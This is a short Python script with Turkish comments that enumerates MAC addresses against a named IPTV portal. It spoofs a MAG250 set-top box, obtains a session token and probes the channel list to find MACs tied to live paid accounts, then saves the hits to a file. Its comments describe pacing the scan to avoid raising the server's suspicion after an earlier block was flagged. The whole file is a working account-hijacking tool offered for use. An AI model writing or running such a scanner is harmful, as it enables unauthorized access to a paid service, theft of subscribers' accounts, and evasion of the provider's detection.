import requests
import json

portal_url = "http://dm.lion-ott.com/portal.php"

def gercek_mi(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;'
    }
    try:
        # 1. Adım: Handshake (Anahtar İste)
        res = requests.get(f"{portal_url}?type=stb&action=handshake&token=", headers=headers, timeout=10)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. Adım: KRİTİK TEST - Sunucudan kanal kategorilerini iste
            # Sahte sunucular burada ya hata verir ya da boş döner.
            test_url = f"{portal_url}?type=itv&action=get_categories&token={token}"
            test_res = requests.get(test_url, headers=headers, timeout=10)
            
            # Eğer yanıtın içinde gerçek bir kategori başlığı (category_id veya title) varsa GERÇEKTİR
            if "category_id" in test_res.text:
                print(f"🎯 GERÇEK MAC: {mac}")
                return f"{mac} | DOĞRULANMIŞ"
    except:
        pass
    return None

def baslat():
    # FARKLI BİR BLOK DENEYELİM (7C:6B fişlendi)
    yeni_base = "00:1A:79:4C:A5" 
    print(f"🕵️ Sahte savar tarama başladı: {yeni_base}")
    
    dogrulanmislar = []
    # Sunucuyu şüphelendirmemek için sıralı ve yavaş gidelim
    for i in range(50): 
        mac = f"{yeni_base}:{hex(i)[2:].zfill(2).upper()}"
        sonuc = gercek_mi(mac)
        if sonuc:
            dogrulanmislar.append(sonuc)
    
    with open("calisan_maclar.txt", "w") as f:
        if dogrulanmislar:
            for d in dogrulanmislar:
                f.write(f"http://dm.lion-ott.com/c/ | {d}\n")
        else:
            f.write("Maalesef bu blokta GERÇEK bir adres bulunamadı.")
